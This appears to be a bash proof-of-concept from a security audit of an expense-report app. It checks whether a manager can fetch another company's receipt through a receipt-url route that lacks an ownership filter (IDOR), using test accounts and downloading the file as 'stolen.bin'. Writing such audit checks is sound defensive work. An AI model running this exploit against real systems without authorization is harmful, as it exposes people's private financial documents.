#!/usr/bin/env bash
# V-06 — Un manager obtient-il l'URL de reçu d'une note qui n'appartient à
# aucun de ses subordonnés (autre chaîne hiérarchique / autre entreprise) ?
# Route visée : GET /api/manager/expense-notes/<id>/receipt-url (pool brut,
# WHERE id seul, aucun filtre de rattachement).
set -u
cd "$(dirname "$0")"; . ./_lib.sh
require_app
ensure_bucket

# Victime : employé d'une entreprise DIFFÉRENTE, sans lien avec le manager démo.
VDOMAIN="poc-v-06.test"
VID="$(ensure_test_user "victim@$VDOMAIN" "poc06pass" "employee" "$VDOMAIN")"
MGR_ID="$(pq "SELECT id FROM users WHERE email='$MANAGER_EMAIL';")"
note "victime=$VID (entreprise $VDOMAIN, manager_id=NULL) ; manager démo=$MGR_ID"

# La victime crée une note AVEC un vrai reçu, via l'API HTTP réelle.
png_fixture "$WORK/px.png"
VC="authjs.session-token=$(applogin "victim@$VDOMAIN" poc06pass)"
NOTE="$(curl -s -b "$VC" -X POST "$BASE_URL/api/expense-notes" \
  -F "amount=99.99" -F "expenseDate=2026-02-02" \
  -F "description=VICTIM private receipt (poc06)" -F "receipt=@$WORK/px.png;type=image/png")"
VNID="$(echo "$NOTE" | jq -r .id)"
[ -n "$VNID" ] && [ "$VNID" != "null" ] || fail2 "création de la note victime a échoué : $NOTE"
note "note victime = $VNID (reçu $(echo "$NOTE" | jq -r .receiptKey))"

MC="authjs.session-token=$(applogin "$MANAGER_EMAIL" "$MANAGER_PASS")"

echo "== Contrôle : route approve du manager sur la note victime (attendu 404) =="
APPROVE_CODE="$(curl -s -o /dev/null -b "$MC" -X POST "$BASE_URL/api/manager/expense-notes/$VNID/approve" -w '%{http_code}')"
note "approve => HTTP $APPROVE_CODE (le manager n'est PAS rattaché : note bien étrangère)"

echo "== Attaque : route receipt-url du manager sur la note victime =="
RESP="$(curl -s -b "$MC" "$BASE_URL/api/manager/expense-notes/$VNID/receipt-url" -w $'\n%{http_code}')"
RU_CODE="$(echo "$RESP" | tail -1)"
URL="$(echo "$RESP" | head -1 | jq -r .url 2>/dev/null)"
note "receipt-url => HTTP $RU_CODE"
note "url = $URL"

echo "== Récupération effective du fichier reçu de la victime =="
FETCH="$(curl -s -o "$WORK/stolen.bin" -w '%{http_code}/%{size_download}' "$URL")"
note "GET URL => $FETCH"
HEAD="$(xxd "$WORK/stolen.bin" 2>/dev/null | head -1)"
note "octets: $HEAD"

echo
if [ "$APPROVE_CODE" = "404" ] && [ "$RU_CODE" = "200" ] && echo "$FETCH" | grep -q '^200/' && echo "$HEAD" | grep -qi 'PNG'; then
  echo "=> Le manager obtient l'URL et récupère le reçu d'une note d'une AUTRE"
  echo "   entreprise, alors que la route approve lui refuse (404) la même note."
  verdict CONFIRMÉ
else
  echo "=> Comportement inattendu (approve=$APPROVE_CODE receipt-url=$RU_CODE fetch=$FETCH)."
  verdict PARTIEL
fi
